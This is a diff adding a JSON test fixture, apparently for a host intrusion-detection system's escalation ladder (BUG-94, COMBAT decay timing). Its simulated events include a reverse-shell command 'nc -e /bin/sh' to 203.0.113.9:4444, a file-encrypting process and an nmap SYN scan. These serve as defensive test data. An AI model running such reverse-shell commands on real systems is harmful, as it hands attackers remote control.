@@ -1,0 +1,22 @@
+{
+  "about": "Lot 314 (the third bug hunt, BUG-94): the quiet window of an unlocked COMBAT counts from the last escalation signal. The story of ransomware-corroborated-combat reaches COMBAT, unlocked, at 602 s (nc corroborating the encryption of the same session); 20 minutes later the session runs nc again (ExploitAttempt: an escalation signal, recorded); 16 minutes after that it runs nmap (Reconnaissance: ALERTED tier, not a signal — but an event with a hit, which prunes the corroboration ledger to its 15-minute window). COMBAT holds until 30 minutes after the second nc (3602 s) and decays at the next tick (3660 s). On main the prune dropped the nc's entry and the quiet was read from COMBAT's entry: COMBAT decayed at the tick after the nmap, about 16 minutes early, and the ladder stood down.",
+  "path": ["ENGAGED", "COMBAT", "ENGAGED"],
+  "stages": ["INVESTIGATE", "NEUTRALIZE"],
+  "signed": ["combat_stage", "combat_outcome"],
+  "start_ns": 150000000000,
+  "procs": [
+    {"pid": 6100002, "ppid": 1, "start_ns": 100000000000, "uid": 0, "comm": "sshd", "exe": "/usr/sbin/sshd", "argv": ["sshd: u1000 [priv]"], "loginuid": 1000, "cgroup": "/user.slice/user-1000.slice/session-7.scope"},
+    {"pid": 6100003, "ppid": 6100002, "start_ns": 101000000000, "uid": 1000, "comm": "bash", "exe": "/usr/bin/bash", "argv": ["-bash"], "tty": true}
+  ],
+  "entropy": [{"prefix": "/home/u/docs/", "examined": 4, "high": 4}],
+  "items": [
+    {"event": {"ProcessSpawn": {"pid": 6100010, "ppid": 6100003, "uid": 1000, "gid": 1000, "comm": "nc", "filename": "/usr/bin/nc.openbsd", "timestamp_ns": 200000000000, "argv": ["nc", "-e", "/bin/sh", "203.0.113.9", "4444"], "parent_comm": "bash", "parent_start_ns": 101000000000, "start_ns": 199999000000, "exe": {"path": "/usr/bin/nc.openbsd"}}}},
+    {"event": {"ProcessSpawn": {"pid": 6100020, "ppid": 6100003, "uid": 1000, "gid": 1000, "comm": "nn-ms-enc", "filename": "/home/u/.local/bin/nn-ms-enc", "timestamp_ns": 600000000000, "argv": ["nn-ms-enc", "/home/u/docs"], "parent_comm": "bash", "parent_start_ns": 101000000000, "start_ns": 599999000000, "exe": {"path": "/home/u/.local/bin/nn-ms-enc"}}}},
+    {"host": {"spawn": [{"pid": 6100021, "ppid": 6100020, "start_ns": 600500000000, "uid": 1000, "comm": "nn-ms-enc", "exe": "/home/u/.local/bin/nn-ms-enc"}]}},
+    {"event": {"FileBurst": {"pid": 6100020, "uid": 1000, "comm": "nn-ms-enc", "kind": "RenameExtension", "count": 20, "appended": 20, "sources": 0, "filename": "/home/u/docs/f19.odt.locked", "timestamp_ns": 602000000000}}},
+    {"event": {"TcpConnect": {"pid": 6100020, "uid": 1000, "comm": "nn-ms-enc", "family": 2, "src_addr": [10, 0, 2, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], "src_port": 41000, "dst_addr": [203, 0, 113, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], "dst_port": 443, "timestamp_ns": 605000000000}}},
+    {"event": {"ProcessSpawn": {"pid": 6100030, "ppid": 6100003, "uid": 1000, "gid": 1000, "comm": "nc", "filename": "/usr/bin/nc.openbsd", "timestamp_ns": 1802000000000, "argv": ["nc", "203.0.113.9", "4444"], "parent_comm": "bash", "parent_start_ns": 101000000000, "start_ns": 1801999000000, "exe": {"path": "/usr/bin/nc.openbsd"}}}},
+    {"event": {"ProcessSpawn": {"pid": 6100031, "ppid": 6100003, "uid": 1000, "gid": 1000, "comm": "nmap", "filename": "/usr/bin/nmap", "timestamp_ns": 2762000000000, "argv": ["nmap", "-sS", "10.0.0.0/24"], "parent_comm": "bash", "parent_start_ns": 101000000000, "start_ns": 2761999000000, "exe": {"path": "/usr/bin/nmap"}}}},
+    {"wait": {"secs": 1100}}
+  ]
+}
